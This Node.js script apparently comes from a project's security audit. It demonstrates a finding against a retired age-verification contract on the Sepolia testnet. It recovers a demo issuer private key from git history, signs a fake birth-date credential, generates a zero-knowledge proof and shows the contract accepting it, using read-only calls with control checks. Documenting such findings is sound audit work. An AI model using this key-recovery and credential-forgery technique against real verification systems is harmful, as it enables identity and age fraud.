#!/usr/bin/env node
// Demonstrates finding F1 (SECURITY_NOTES.md) against the retired v1 deployment:
// with the v1 demo key, which is public in git history, anyone can sign a
// credential for any date of birth, prove it with the published v1 circuit, and
// the deployed ZkIdPolicy on Sepolia returns Accepted.
//
// Read-only: the policy is queried with eth_call. No transaction is sent and no
// funds are needed. The key is read from git into memory and never written out.
//
// Needs: cd backend && npm run fetch-circuit; cd tools/v1-audit && npm install
// Usage: node forge_v1_age_proof.mjs   (SEPOLIA_RPC_URL overrides the RPC)
import { execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { ethers } from 'ethers';

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.join(here, '..', '..');
const require = createRequire(import.meta.url);
const snarkjs = require(require.resolve('snarkjs', { paths: [path.join(root, 'backend')] }));
const { signPayload } = require(path.join(root, 'tools/test-issuer/sign_credential.js'));
const { generateTestKeys } = require(path.join(root, 'tools/test-issuer/keys.js'));
const { buildCircuitInput } = require(path.join(root, 'backend/circuits/credential-age-proof/gen_input.js'));

const POLICY = '0x8eDa6b1A54900c60C6b730796FfDd51a5327714f';
const RPC = process.env.SEPOLIA_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com';
// Last v1 commit (tag v1-mock-issuer-demo). The key file was committed in 8e03e69.
const V1_COMMIT = 'e94fcb5404f9c98b3a8cbb121732c3de0126f298';
const CAP = path.join(root, 'backend/circuits/credential-age-proof');
const WASM = path.join(CAP, 'credential_age_proof_js/credential_age_proof.wasm');
const ZKEY = path.join(CAP, 'cap_final.zkey');
const RESULTS = ['Accepted', 'UntrustedIssuer', 'CutoffTooLate', 'NothingClaimed', 'InvalidProof'];
const ABI = ['function checkAge(uint256[2] pA, uint256[2][2] pB, uint256[2] pC, uint256[18] pubSignals) view returns (uint8)'];

// Obviously fake: nobody is born in 1900 and holds this ID number.
const FORGED = { name: 'Forged By Anyone', dob: '1900-01-01', id_number: '000000000000', gender: 'O' };

function v1DemoKeys() {
  const pem = execFileSync('git', ['-C', root, 'show', `${V1_COMMIT}:mock-issuer/mock_issuer_private.pem`], { encoding: 'utf8' });
  const privateKey = crypto.createPrivateKey(pem);
  return { privateKey, publicKey: crypto.createPublicKey(privateKey) };
}

// snarkjs -> Solidity calldata. pi_b's inner pairs are reversed for the verifier.
const calldata = (proof, signals) => [
  [proof.pi_a[0], proof.pi_a[1]],
  [
    [proof.pi_b[0][1], proof.pi_b[0][0]],
    [proof.pi_b[1][1], proof.pi_b[1][0]],
  ],
  [proof.pi_c[0], proof.pi_c[1]],
  signals,
];

async function proveWith(keys, cutoff) {
  const { circuitInputs } = signPayload(FORGED, keys);
  return snarkjs.groth16.fullProve(buildCircuitInput(circuitInputs, cutoff).input, WASM, ZKEY);
}

const provider = new ethers.JsonRpcProvider(RPC, undefined, { staticNetwork: true });
const policy = new ethers.Contract(POLICY, ABI, provider);
const block = await provider.getBlock('latest');
const day = new Date(block.timestamp * 1000);
// ZkIdPolicy.cutoffDate: that UTC day's YYYYMMDD minus 18 years.
const cutoff = day.getUTCFullYear() * 10000 + (day.getUTCMonth() + 1) * 100 + day.getUTCDate() - 180000;
const ask = async (proof, signals) => RESULTS[Number(await policy.checkAge(...calldata(proof, signals), { blockTag: block.number }))];

console.log(`Sepolia block ${block.number} (${day.toISOString()}), cutoff ${cutoff}, forged DOB ${FORGED.dob}`);

const forged = await proveWith(v1DemoKeys(), cutoff);
console.log(`1. forged with the public v1 demo key      -> ${await ask(forged.proof, forged.publicSignals)}   (expected Accepted: the finding)`);

const corrupted = structuredClone(forged.proof);
corrupted.pi_c[1] = (BigInt(corrupted.pi_c[1]) ^ 1n).toString();
console.log(`2. same proof, one bit of pi_c flipped     -> ${await ask(corrupted, forged.publicSignals)}   (expected InvalidProof: the verifier is real)`);

const fresh = await proveWith(generateTestKeys(), cutoff);
console.log(`3. same credential under a fresh random key -> ${await ask(fresh.proof, fresh.publicSignals)}   (expected UntrustedIssuer: the issuer check works)`);

await globalThis.curve_bn128?.terminate();
